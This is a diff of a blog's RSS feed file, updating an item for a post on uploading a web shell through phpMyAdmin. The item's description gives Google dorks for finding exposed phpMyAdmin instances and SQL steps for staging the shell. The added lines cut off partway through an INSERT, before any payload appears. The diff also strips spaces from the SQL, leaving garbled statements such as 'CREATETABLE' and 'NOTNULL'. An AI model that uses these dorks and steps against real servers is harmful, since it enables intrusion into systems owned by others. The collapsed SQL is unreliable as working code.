@@ -30,8 +30,9 @@
         <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
         <guid>https://thiklab.com/posts/upload-shell-via-phpmyadmin/</guid>
         <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query Go to phpMyadmin database and create new database, ex: &amp;ldquo;uploader&amp;rdquo; and than select on SQL tap and paste this code below.
-1 2 3  CREATE TABLE `uploader`.`userform` ( `track1` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ;   And this code.
-1 2 3  CREATE TABLE `uploader`.`user_upload` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ;   Now select on table user_upload and SQL tap and paste this code below.</description>
+1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   And this code.
+1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   Now select on table user_upload and SQL tap and paste this code below.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(&amp;#39;&amp;lt;!</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://thiklab.comimages/feature/article-one.png" medium="image"><media:title type="html">featured image</media:title></media:content>
